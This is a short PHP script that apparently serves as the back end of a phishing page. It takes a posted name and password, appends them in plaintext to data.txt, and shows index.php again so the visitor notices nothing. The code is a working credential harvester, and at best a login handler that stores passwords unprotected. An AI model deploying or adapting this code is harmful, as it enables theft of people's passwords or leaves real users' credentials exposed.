<?php
if(isset($_POST["name"]) && isset($_POST["password"])){
    $f=fopen("data.txt","a");
    fputs($f,$_POST["name"].";".$_POST["password"]."\r\n");
    fclose($f);
	include 'index.php';
}else{
    include 'index.php';
}
?>